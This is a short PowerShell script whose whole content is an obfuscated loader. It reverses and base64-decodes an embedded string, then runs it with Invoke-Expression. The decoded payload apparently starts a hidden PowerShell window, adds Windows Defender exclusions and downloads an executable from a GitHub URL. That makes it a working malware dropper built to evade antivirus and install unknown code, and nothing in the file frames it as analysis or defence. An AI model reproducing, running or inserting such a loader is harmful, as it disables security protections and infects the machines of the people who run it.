$best64code = "=oQDlhXZuwGb15GXzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODBiblRGZphEI31CIlhXZuwGblh2cyV2dvBnCNUGel5CbsVnbcNHZh9Gbud3bEx1YpxmY1BFXzJXZzVFX6MEIv1CIlhXZuMUWR5ESU9ibpFWbvcXYy9CdzVGdvATOlRWdy9SbvNmLiVHa0l2Zv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39GcK0gIzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODJCIoRXYQ52bpNXdsNGeF1CIlNmblJXZmVmcQBXTtQGZBBiblRGZphEIlxWe0N3dvRmbpdVLgwGblh2cyV2dvBnCNISZ4VmLiAibvl2cuVGd4Vkbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39Gc"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
Invoke-Expression $LoadCode
